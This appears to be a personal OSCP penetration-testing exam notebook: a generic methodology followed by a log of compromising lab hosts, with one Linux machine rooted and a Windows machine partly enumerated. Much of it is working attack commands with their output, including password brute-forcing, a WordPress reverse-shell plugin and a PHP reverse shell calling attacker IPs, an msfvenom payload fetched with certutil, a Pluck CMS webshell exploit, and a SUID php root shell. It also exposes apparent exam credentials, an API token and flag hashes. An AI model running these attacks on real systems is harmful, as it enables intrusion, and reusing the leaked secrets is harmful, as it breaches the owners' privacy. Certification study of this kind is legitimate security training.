Written by Zen as a hedge against performance anxiety when you know what you need to do and just need to hash out the emotionless results and instinctively like breathing air.

Optimized for speed on not stealth. This method is EXTREMELY LOUD on networks and has a near GUARANTEE to get the user IP blocked or even globally blacklisted

Mind-maps
---
Generald
https://xmind.app/m/QsNUEz/

Active Directory
https://xmind.app/m/vQuTSG/
# Exam Prep

Download the ovpn pack and extract
```sh
bzip2 --decompress exam-connection.tar.bz2 && tar -xf exam-connection.tar
```

connect
```sh
sudo openvpn OS-######-OSCP.exam
```
**Username:** `OS-570362`
**Password:** `Ebkh3FAtZvW`

![[Pasted image 20231106173219.png]]

Suggested browser is Google Chrome / Chromium-based

Login OS ID: `570362`
Login Hash: `467904fe97aad23fe6564ab1a83486b1`
After connecting go to the control panel from the email. SSL error will show but continue via advanced settings
![[Pasted image 20231106173502.png]]

# Exam Objectives

Target IP: 172.16.128.100
--------------------------------------

Maximum Potential Points: 40

You have agreed with the client to perform an external black box penetration test against their Microsoft Windows Active Directory infrastructure. 

The final objective of the Active Directory penetration test is to gain Domain Administrator level rights on the network. The Active Directory network can be located at the following IP addresses:


172.16.128.100
172.16.128.102
192.168.128.101

Main Objectives:

- Get Administrative interactive access to the MS02 client machine and obtain the proof.txt file in a valid way, note that there is no local.txt file.
- Get Administrative interactive access to the MS01 client machine and obtain local.txt and proof.txt files in a valid way.
- Get Administrative interactive access to the Domain Controller and obtain the proof.txt file in a valid way, note that there is no local.txt file.
- Submit local.txt and proof.txt files in the Control Panel.

Documentation Requirements:

- Document each step and command of your attack in a way that it can be replicated following a "copy/paste" approach
- Create screenshots showing various steps and stages of the attack performed
- Create a valid screenshot showing the content of proof.txt and the machine IP address
- Provide the link or the copy of the script/exploits being used
- Document any changes done to the original scripts or exploits being used
- Provide a summary and overview of the vulnerabilities found in performed attacks and exploitation process. You must show all steps executed against the entire Active Directory domain used to obtain Domain Administrator privileges. 

To ensure the stability of the Active Directory network, it is not possible to revert a single specific VM. Instead, reverting any of the target machines in the AD network will revert all the machines at once.
IMPORTANT NOTE: Please ensure to wait for 5 minutes after reverting the machines to ensure all necessary services are working properly.

Note that reverting all machines can take an estimated five to seven (5-7) minutes.

Please note that not all machines will respond to ICMP/ping requests.
Should you believe a machine is not working properly after a revert, please make sure to follow the Exam Contact Protocol outlined in the OSCP Exam Guide.

There are no dependencies between the Active Directory infrastructure and the freestanding hosts.

Target IP: 192.168.128.110
--------------------------------------

Maximum Potential Points: 20

Main Objectives:

- Get interactive access to the machine and obtain local.txt file in valid way
- Submit local.txt in the Control Panel
- Get interactive access to the machine and obtain proof.txt file in valid way
- Submit proof.txt in the Control Panel

Documentation Requirements:

- Document each step and command of your attack in a way that it can be replicated following a "copy/paste" approach
- Create screenshots showing various steps and stages of the attack performed
- Create a valid screenshot showing the content of local.txt and machine IP address
- Create a valid screenshot showing the content of proof.txt and machine IP address
- Provide the link or the copy of the script/exploits being used
- Document any changes done to the original scripts or exploits being used
- Provide a summary and overview of the vulnerabilities found, performed attacks and exploitation process

Target IP: 192.168.128.111
--------------------------------------

Maximum Potential Points: 20

Main Objectives:

- Get interactive access to the machine and obtain local.txt file in valid way
- Submit local.txt in the Control Panel
- Get interactive access to the machine and obtain proof.txt file in valid way
- Submit proof.txt in the Control Panel


Documentation Requirements:

- Document each step and command of your attack in a way that it can be replicated following a "copy/paste" approach
- Create screenshots showing various steps and stages of the attack performed
- Create a valid screenshot showing the content of local.txt and machine IP address
- Create a valid screenshot showing the content of proof.txt and machine IP address
- Provide the link or the copy of the script/exploits being used
- Document any changes done to the original scripts or exploits being used
- Provide a summary and overview of the vulnerabilities found, performed attacks and exploitation process

Target IP: 192.168.128.124
--------------------------------------

Maximum Potential Points: 20

Main Objectives:

- Get interactive access to the machine and obtain local.txt file in valid way
- Submit local.txt in the Control Panel
- Get interactive access to the machine and obtain proof.txt file in valid way
- Submit proof.txt in the Control Panel

Documentation Requirements:

- Document each step and command of your attack in a way that it can be replicated following a "copy/paste" approach
- Create screenshots showing various steps and stages of the attack performed
- Create a valid screenshot showing the content of local.txt and machine IP address
- Create a valid screenshot showing the content of proof.txt and machine IP address
- Provide the link or the copy of the script/exploits being used
- Document any changes done to the original scripts or exploits being used
- Provide a summary and overview of the vulnerabilities found, performed attacks and exploitation process

# Prep

Framework assumes the pentester is using the latest version of Kali. A bare-metal OS works best to prevent driver issues with GPU in case of needing to password crack.

Confirm docker is installed and set rustscan as an alias or add to bashrc / fish config due to it being able to scan all ports and services in 10 seconds
```sh
alias rustscan='sudo docker run -it --rm --name rustscan rustscan/rustscan:2.1.1 -a'
```
# OS Agnostic

Target IP either given or discovered via
```sh
netdiscover
```

set up a directory for the target and enter it

```sh
mkdir Target1-192.168.x.x
cd Target1-192.168.x.x
```

## Recon
Start with a quick open port scan
```sh
rustscan 192.168.x.x
```

Follow up with a service scan on those open ports
```sh
nmap -sC -sV -p21,22,80,3306 -v -T5 192.168.x.x -oN Target#Services.nmap
```

### Web Server(s) 80,443,8080
If web server start run the following
```sh
dirb http://192.168.x.x
```

```sh
dirbuster
```
	wordlist is in /usr/share/wordlists/dirtbuster/directory-list-2.3-medium

open up `burpsuite` and run a browser to check out the web servers for saving and reviewing the web request history easily.
### Samba / SMB 445
run nmap scripts for smb services which enumerates shares and checks for eternal blue
```sh
nmap -Pn -p445 -T5 --script=smb-vuln-ms17-010,smb-enum-shares,smb-enum-users,smb-enum-domains,smb-brute --open 192.168.x.x -v -oN smbScripts.nmap
```
## Weaponize
### FTP Servers
Smash it with a hydra
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.x.x ftp
```
### Web Servers
If web login form simultaneously run hydra
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.x.x http-post-form "/admin/login.php:username=^USER^&password=^PASS^:User name or password incorrect"
```
	Change the path of /admin/login.php to whatever you find in burp's request history. The error message in the final : delimited colums also needs to be changed as well to match what is found.

If wordpress then run wpscan and enumerate 
```
wpscan --url http://192.168.x.x/wordpress/ -e -t 25 -v  --force --api-token Sy5tZcHbYUJyHJbw6TbZBNqiyIO9copNXdF6Zkzh3cg -o WPScan.txt
```

If Users are found from enumeration "-e" then crack their logins

```
wpscan --url http://192.168.x.x/wordpress/ -t 20 -v  --force -U admin,user1,user2 -P /usr/share/wordlists/rockyou.txt
```

Once logged in then add in pentest monkey's reverse shell php code into the theme editor on one of the pages
![[Pasted image 20231105103720.png]]

Or upload the reverse shell plugin as a zip file
https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
```
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.86.99/443 0>&1'");
?>
```
### Samba
Non Metasploit Eternal Blue Exploit
https://github.com/3ndG4me/AutoBlue-MS17-010/blob/master/README.md

## Access
MySQL has a specific way of accessing it since you need -p but type the password later
```sh
mysql --host=192.168.x.x --port=3306 --user=USERNAME -p
```

Or use GUI based `dbeaver`
# Linux Targets

## Access
Prep a nc listener

```sh
nc -nlvp 4444
```

Confirm ip address
```sh
hostname -I
```

Add IP and port to the reverse shell builder
https://www.revshells.com/

### Post Access

Check username & ID
```sh
whoami && id
```

Upgrade the shell for something more stable
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Search for `local.txt`
```sh
find / -type f -name "local.txt" 2>/dev/null
```

## Privilege Escalation

### Misconfigurations
If "curl" is present then run linpeas.sh and parse it's contents
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

No curl then download linpeas.sh from the kali host assuming `wget` is present from the /tmp directory due to write permissions then add executable privileges  
```
cd /tmp
wget http://192.168.x.x/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

#### Set SUID on Escalatable Programs
For manual SUID program checking 
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

For SUID programs, check gtfo bins for SUID escalations
https://gtfobins.github.io

![[Pasted image 20231105104203.png]]

#### Sudo Programs in CRONTAB
Check the system level crontab
```
cat /etc/crontab
```

Check programs referenced for modification privileges
```
cd /path/to/cron/referenced/file && ls -alt
```
### Kernel Exploits
No SUID programs then check kernel version and check searchsploit for local privledge escalation vulnerabilities or check linpeas.sh output
```
hostnamectl
```

If hostnamectl isn't available
```
uname -r
```

```
searchsploit #.#.#
```
### Sudo Perms
Check Sudo permissions
```sh
sudo -l
```

From the output see what can be modified or escalated from https://gtfobins.github.io or via systemctl services

Example if `/usr/bin/reboot` has sudo privilege 

```ini
[Unit]
Description=Reverse Shell
After=network-online.target
 
[Service]
Type=simple
WorkingDirectory=/home/USER
ExecStart=/home/USER/reverse.sh
TimeoutSec=30
RestartSec=15s
User=USER
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure
 
[Install]
WantedBy=multi-user.target
```

Then run the privileged command  
```
sudo reboot
```
## Actions On Objectives

Confirm flag hashes were found. root flag is in /root/proof.txt

```sh
cat /root/proof.txt
```

Submit hashes 

# Windows Targets

## Weaponize
Windows Exploit suggester
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

make payloads with msfvenom
## Access
https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/


Kerberos Vulns
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

Create a windows reverse shell on kali

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.x.x LPORT=4444 -f exe > payload.exe
```

Serve it with python from the local directory
```sh
python -m http.server 80
```

Download the payload on the target
```powershell
certutil -urlcache -split -f "http://192.168.x.x/payload.exe"
```

Run the reverse shell
```powershell
cmd /c C:\\ftp\\payload.exe
```

Port forward port 80 on target machine to remote attacking machine's port 80 via ssh
```sh
sudo ssh -L 80:192.168.49.131:80 ariah@192.168.131.99
```
## Privilege Escalation

Bypass PowerScript **E**xecution **P**ermission protections
```powershell
powershell -ep bypass
```
### File transfers
https://www.ired.team/offensive-security/defense-evasion/downloading-file-with-certutil

#### Via certutil
```powershell
certutil.exe -urlcache -f http://192.168.x.x/winPEASx64.exe c:/tools/winPEASx64.exe
```

accesschk
```powershell
certutil.exe -urlcache -f http://192.168.x.x/accesschk64.exe c:/tools/accesschk64.exe
```

#### Via Samba shares

Serving the file on kali
```sh
sudo impacket-smbserver TMP /var/www/html/
```

Receiving the file on Windows
```powershell
copy \\192.168.x.x\TMP\winPEASx64.exe .   
```

### Misconfigurations

Download and Run WinPEAS from the releases page and enjoy the show (takes some time)
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
https://github.com/carlospolop/PEASS-ng/releases

One liner web download 
```powershell
powershell -ep bypass -Command "Invoke-WebRequest -Uri 'https://github.com/carlospolop/PEASS-ng/releases/download/20231105-d387d97f/winPEASx64.exe' -OutFile 'winPEASx64.exe'"
```

WinPEAS options for speed
        domain               Enumerate domain information
        systeminfo           Search system information
        userinfo             Search user information
        processinfo          Search processes information
        servicesinfo         Search services information
        applicationsinfo     Search installed applications information
        networkinfo          Search network information
        windowscreds         Search windows credentials
        browserinfo          Search browser information
        filesinfo            Search generic files that can contains credentials
        fileanalysis         Search specific files that can contains credentials and for regexes inside files
        eventsinfo           Display interesting events information

1. Insecure Service Properties
2. Unquoted Service Path
3. Weak Registry Permissions
4. Insecure Service Executables
5. DLL Hijacking

Running AccessChk - multi user
```powershell
accesschk64.exe -accepteula -uws "C:\Users"
```

AccessChk - Single User
```powershell
accesschk.exe /accepteula -uwcqv user USERNAME
```
### LDAP

ldapsearch on Kali
```sh
ldapsearch -x -H ldap://192.168.x.x -D "USER@DOMAIN.COM" -w 'PASSWORD' -b DC=DCNAME,DC=COM '(&(objectCategory=User)(samaccountname=*))' samaccountname | grep -i samaccountname
```

### Potato Privilege Escalations
Juice Potato
https://github.com/ohpe/juicy-potato

https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505

Rogue Potato is for Windows 10 since juicy got patched

### PowerShell Modules / Scripts
#### PowerSploit - PowerView
Download: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```powershell
Import-Module .\PowerView.ps1
```

To find machines with Admin Access
```powershell
Find-LocalAdminAccess
```


#### PowerSploit - PowerUp
Download: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
```powershell
Import-Module .\PowerUp.ps1
```
#### AD-RSAT
https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps

Importing the module
```powershell
powershell -ep bypass
Import-Module ActiveDirectory
```
### DLL Hijacking


### Permission Delegation / ACL Attacks

Check for
	- ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
	- AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
	- GenericAll: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
	- GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
	- WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
	- WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
	- AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.

To assist with visualizing the AD network use Bloodhound
#### BloodHound - SharpHound AD Visualizer

1. SharpHound first which gets a zip file
2. Bloodhound to analyze the zip file
	1. Upload the data zip
On Windows
```
certutil -urlcache -split -f "http://192.168.x.x/rbcd.py"
```

```
.\SharpHound.exe -c all
```

On Evil-WinRM via PS
```
upload /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
```

```
download 20220110120802_BloodHound.zip
```

On Kali
- As docker
```
sudo docker run -it \	
   -p 7474:7474 \
   -e DISPLAY=unix$DISPLAY \
   -v /tmp/.X11-unix:/tmp/.X11-unix \
   --device=/dev/dri:/dev/dri \
   -v ~/Desktop/bloodhound/data:/data \
   --name bloodhound belane/bloodhound
```

- On system start the console & GUI 
```
sudo neo4j console
```

```
bloodhound --no-sandbox
```

default creds `neo4j:neo4j`
Prompted to change my password so changed to `kali`



# Individual Targets
## 192.168.128.110 - Linux - Vuln Web App - ROOTED

Target IP  given

Set up a directory for the target and enter it
```sh
mkdir Linux-192.168.128.110
cd Linux-192.168.128.110
```
### Recon
Start with a quick open port scan
```sh
rustscan 192.168.128.110
```
	PORT     STATE SERVICE    REASON
	22/tcp   open  ssh        syn-ack
	80/tcp   open  http       syn-ack
	592/tcp  open  eudora-set syn-ack
	8080/tcp open  http-proxy syn-ack

Follow up with a service scan on those open ports
```sh
nmap -sC -sV -p22,80,592,8080 -v -T5 192.168.128.110 -oN 192.168.128.110-Services.nmap
```
	PORT     STATE SERVICE VERSION                                                  
	22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                    
	| ssh-hostkey:                                                                  
	|   3072 52:00:5c:9a:9f:66:dd:7a:a1:84:8c:a4:98:ca:5c:c3 (RSA)                  
	|   256 16:cc:a3:c9:db:a2:5d:dd:36:ae:b9:96:c5:69:6d:89 (ECDSA)                 
	|_  256 b3:d4:45:6e:2c:c4:bf:81:cb:85:3b:8f:d6:b2:b2:ce (ED25519)               
	80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))                           
	|_http-server-header: Apache/2.4.41 (Ubuntu)                                    
	| http-methods:                                                                 
	|_  Supported Methods: GET POST OPTIONS HEAD                                    
	|_http-title: Pool Game                                                         
	592/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))                           
	|_http-server-header: Apache/2.4.41 (Ubuntu)                                    
	|_http-generator: pluck 4.7.13
	| http-robots.txt: 2 disallowed entries 
	|_/data/ /docs/
	| http-cookie-flags: 
	|   /: 
	|     PHPSESSID: 
	|_      httponly flag not set
	| http-title: Coming Soon - Under Construction
	|_Requested resource was http://192.168.128.110:592/?file=coming-soon
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	|_http-open-proxy: Proxy might be redirecting requests
	| http-methods: 
	|_  Supported Methods: GET POST OPTIONS HEAD
	|_http-title: Site doesn't have a title (text/html).
	|_http-server-header: Apache/2.4.41 (Ubuntu)
	| http-robots.txt: 1 disallowed entry 
	|_/
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
#### Web Server(s) 80,592,8080
If web server start run the following
```sh
dirb http://192.168.128.110
```

```sh
dirbuster
```
wordlist is in `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

open up `burpsuite` and run a browser to check out the web servers for saving and reviewing the web request history easily.

##### 80

80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))                           
|_http-server-header: Apache/2.4.41 (Ubuntu)                                    
| http-methods:                                                                 
|_  Supported Methods: GET POST OPTIONS HEAD                                    
|_http-title: Pool Game   

![[Pasted image 20231106194749.png]]

```sh
dirb http://192.168.128.110
```
![[Pasted image 20231106194134.png]]
Seems like a game with no admins or anything. Just game files


##### 592 Rooted

592/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))                           
|_http-server-header: Apache/2.4.41 (Ubuntu)                                    
|_http-generator: pluck 4.7.13
| http-robots.txt: 2 disallowed entries 
|_/data/ /docs/
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Coming Soon - Under Construction
|_Requested resource was http://192.168.128.110:592/?file=coming-soon
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

target URL: http://192.168.128.110
```sh
dirbuster
```
wordlist is in `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![[Pasted image 20231106194248.png]]
PHP Admin page

went to http://192.168.128.110/login.php and used the password `admin` which worked

![[Pasted image 20231106195242.png]]

Running `pluck 4.7.13`

```
searchsploit pluck 4.7.13           
```       
	 Exploit Title                                                                                                                       |  Path
	Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)                                                                 | php/webapps/49909.py
	Shellcodes: No Results
	Papers: No Results

So since I'm authenticated this should work

```sh
cp /usr/share/exploitdb/exploits/php/webapps/49909.py .
```

```
head -n40 49909.py
```
	target_ip = sys.argv[1]
	target_port = sys.argv[2]
	password = sys.argv[3]
	pluckcmspath = sys.argv[4]

Bad UX lol
```
python3 49909.py 192.168.128.110 592 admin /
```
	Authentification was succesfull, uploading webshell
	Uploaded Webshell to: http://192.168.128.110:592//files/shell.phar

Ghetto webshell lol
![[Pasted image 20231106200255.png]]

Search for `local.txt`
```sh
cd /
find / -type f -name "local.txt" 2>/dev/null
```
	/home/tammy/local.txt

![[Pasted image 20231106200620.png]]

local flag
`155bc29d8ad571c4ce8eead54d451a18`

###### Privilege Escalation

Get a normal reverse shell on my system.
Checked that nc is installed on target

prep. My IP is `192.168.49.128`
```
nc -nlvp 4444
```

Run through revshells.com until one works on this webshell
```sh
php -r '$sock=fsockopen("192.168.49.128",4444);exec("sh <&3 >&3 2>&3");'
```

That worked. Now to upgrade my shell
![[Pasted image 20231106202031.png]]

Python not found so use the script method
```sh
script /dev/null -c bash
```

###### Misconfigurations
Move to `/tmp` as a working directory
```sh
cd /tmp
```

\Linpeas Download methods. If `curl` or `wget` is present then run linpeas.sh and parse it's contents
```sh
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

```sh
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

If neither work then download linpeas.sh from the kali host assuming `wget` is present from the /tmp directory due to write permissions then add executable privileges  
```
wget http://192.168.49.128/linpeas.sh
```
![[Pasted image 20231106202916.png]]

Run Linpeas
```
chmod +x linpeas.sh
./linpeas.sh
```

Major Findings
###### Set SUID on Escalatable Programs
For manual SUID program checking 
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
	-rwsr-xr-x 1 root root 123432 Dec  2  2021 /snap/snapd/14295/usr/lib/snapd/snap-
	confine
	-rwsr-xr-x 1 root root 110792 Apr 10  2020 /snap/snapd/7264/usr/lib/snapd/snap-
	confine
	-rwsr-xr-x 1 root root 85064 Jul 14  2021 /snap/core20/1270/usr/bin/chfn
	-rwsr-xr-x 1 root root 53040 Jul 14  2021 /snap/core20/1270/usr/bin/chsh
	-rwsr-xr-x 1 root root 88464 Jul 14  2021 /snap/core20/1270/usr/bin/gpasswd
	-rwsr-xr-x 1 root root 55528 Jul 21  2020 /snap/core20/1270/usr/bin/mount
	-rwsr-xr-x 1 root root 44784 Jul 14  2021 /snap/core20/1270/usr/bin/newgrp
	-rwsr-xr-x 1 root root 68208 Jul 14  2021 /snap/core20/1270/usr/bin/passwd
	-rwsr-xr-x 1 root root 67816 Jul 21  2020 /snap/core20/1270/usr/bin/su
	-rwsr-xr-x 1 root root 166056 Jan 19  2021 /snap/core20/1270/usr/bin/sudo
	-rwsr-xr-x 1 root root 39144 Jul 21  2020 /snap/core20/1270/usr/bin/umount
	-rwsr-xr-- 1 root systemd-resolve 51344 Jun 11  2020 
	/snap/core20/1270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	-rwsr-xr-x 1 root root 473576 Jul 23  2021 
	/snap/core20/1270/usr/lib/openssh/ssh-keysign
	-rwsr-xr-x 1 root root 43088 Sep 16  2020 /snap/core18/2284/bin/mount
	-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/2284/bin/ping
	-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/2284/bin/su
	-rwsr-xr-x 1 root root 26696 Sep 16  2020 /snap/core18/2284/bin/umount
	-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/2284/usr/bin/chfn
	-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/2284/usr/bin/chsh
	-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/2284/usr/bin/gpasswd
	-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/2284/usr/bin/newgrp
	-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/2284/usr/bin/passwd
	-rwsr-xr-x 1 root root 149080 Jan 19  2021 /snap/core18/2284/usr/bin/sudo
	-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 
	/snap/core18/2284/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	-rwsr-xr-x 1 root root 436552 Aug 11  2021 
	/snap/core18/2284/usr/lib/openssh/ssh-keysign
	-rwsr-xr-x 1 root root 43088 Jan  8  2020 /snap/core18/1705/bin/mount
	-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1705/bin/ping
	-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/1705/bin/su
	-rwsr-xr-x 1 root root 26696 Jan  8  2020 /snap/core18/1705/bin/umount
	-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/1705/usr/bin/chfn
	-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/1705/usr/bin/chsh
	-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/1705/usr/bin/gpasswd
	-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/1705/usr/bin/newgrp
	-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/1705/usr/bin/passwd
	-rwsr-xr-x 1 root root 149080 Jan 31  2020 /snap/core18/1705/usr/bin/sudo
	-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 
	/snap/core18/1705/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	-rwsr-xr-x 1 root root 436552 Mar  4  2019 
	/snap/core18/1705/usr/lib/openssh/ssh-keysign
	-rwsr-sr-x 1 root root 4773816 Jun 13  2022 /usr/bin/php7.4
	-rwsr-xr-x 1 root root 88464 Mar 14  2022 /usr/bin/gpasswd
	-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
	-rwsr-xr-x 1 root root 53040 Mar 14  2022 /usr/bin/chsh
	-rwsr-xr-x 1 root root 55528 Feb  7  2022 /usr/bin/mount
	-rwsr-xr-x 1 root root 85064 Mar 14  2022 /usr/bin/chfn
	-rwsr-xr-x 1 root root 166056 Jan 19  2021 /usr/bin/sudo
	-rwsr-xr-x 1 root root 39144 Feb  7  2022 /usr/bin/umount
	-rwsr-xr-x 1 root root 44784 Mar 14  2022 /usr/bin/newgrp
	-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
	-rwsr-xr-x 1 root root 67816 Feb  7  2022 /usr/bin/su
	-rwsr-xr-x 1 root root 68208 Mar 14  2022 /usr/bin/passwd
	-rwsr-xr-x 1 root root 473576 Mar 30  2022 /usr/lib/openssh/ssh-keysign
	-rwsr-xr-x 1 root root 142792 May 11  2022 /usr/lib/snapd/snap-confine
	-r-sr-xr-x 1 root root 14416 Jan 17  2022 /usr/lib/vmware-tools/bin64/vmware-
	user-suid-wrapper
	-r-sr-xr-x 1 root root 13712 Jan 17  2022 /usr/lib/vmware-tools/bin32/vmware-
	user-suid-wrapper
	-rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-
	helper-1
	-rwsr-xr-- 1 root messagebus 51344 Apr 29  2022 /usr/lib/dbus-1.0/dbus-daemon-
	launch-helper
	-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
	-rwsr-sr-x 1 root root 14488 Jul  6  2022 /usr/lib/xorg/Xorg.wrap
	-rwsr-xr-- 1 root dip 395144 Jul 23  2020 /usr/sbin/pppd

I see `/usr/bin/php7.4` which may work

For SUID programs, check gtfo bins for SUID escalations
https://gtfobins.github.io

![[Pasted image 20231106204223.png]]

So basically try to spawn a root shell via php
```
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
```

Worked
![[Pasted image 20231106204452.png]]
###### Actions On Objectives

Confirm flag hashes were found. root flag is in /root/proof.txt

```sh
cat /root/proof.txt
```

proof.txt `69db791b08252d0b3b8235b9b9082797`

Submit hashes 

##### 8080
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```sh
dirb http://192.168.128.110:8080
```
![[Pasted image 20231106194402.png]]

### Weaponize
#### FTP Servers
Smash it with a hydra
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.x.x ftp
```
#### Web Servers
If web login form simultaneously run hydra
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.x.x http-post-form "/admin/login.php:username=^USER^&password=^PASS^:User name or password incorrect"
```
	Change the path of /admin/login.php to whatever you find in burp's request history. The error message in the final : delimited colums also needs to be changed as well to match what is found.

If wordpress then run wpscan and enumerate 
```
wpscan --url http://192.168.x.x/wordpress/ -e -t 25 -v  --force --api-token Sy5tZcHbYUJyHJbw6TbZBNqiyIO9copNXdF6Zkzh3cg -o WPScan.txt
```

If Users are found from enumeration "-e" then crack their logins

```
wpscan --url http://192.168.x.x/wordpress/ -t 20 -v  --force -U admin,user1,user2 -P /usr/share/wordlists/rockyou.txt
```

Once logged in then add in pentest monkey's reverse shell php code into the theme editor on one of the pages
![[Pasted image 20231105103720.png]]

Or upload the reverse shell plugin as a zip file
https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
```
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.86.99/443 0>&1'");
?>
```
#### Samba
Non Metasploit Eternal Blue Exploit
https://github.com/3ndG4me/AutoBlue-MS17-010/blob/master/README.md

### Access
MySQL has a specific way of accessing it since you need -p but type the password later
```sh
mysql --host=192.168.x.x --port=3306 --user=USERNAME -p
```

Or use GUI based `dbeaver
## 192.168.128.111 - Windows
### Prep

Target IP given

Set up and enter the target directory
```sh
mkdir OSType-192.168.128.111 && cd OSType-192.168.128.111
```
### Recon
Start with a quick open port scan
```sh
rustscan 192.168.128.111
```
	PORT     STATE SERVICE       REASON
	80/tcp   open  http          syn-ack
	135/tcp  open  msrpc         syn-ack
	139/tcp  open  netbios-ssn   syn-ack
	443/tcp  open  https         syn-ack
	445/tcp  open  microsoft-ds  syn-ack
	3389/tcp open  ms-wbt-server syn-ack

*If the following commands don't return anything due to rustscan breaking it then  restart the box*

Quick OS check
```sh
sudo nmap -O --top-ports 1000 -v -T5 192.168.128.111 -oN osType.nmap
```
	Device type: general purpose
	Running (JUST GUESSING): Microsoft Windows 2019 (86%)
	Aggressive OS guesses: Microsoft Windows Server 2019 (86%)
	No exact OS matches for host (test conditions non-ideal).

Follow up with a service scan on those open ports
```sh
sudo nmap -sC -sV -p80,135,139,443,445,3389 -v -T4 192.168.128.111 -oN 192.168.128.111-Services.nmap
```
	PORT     STATE SERVICE       VERSION
	80/tcp   open  http          Microsoft IIS httpd 10.0
	|_http-server-header: Microsoft-IIS/10.0
	| http-methods: 
	|   Supported Methods: OPTIONS TRACE GET HEAD POST
	|_  Potentially risky methods: TRACE
	|_http-generator: Nicepage 5.13.1, nicepage.com
	|_http-title: Home
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
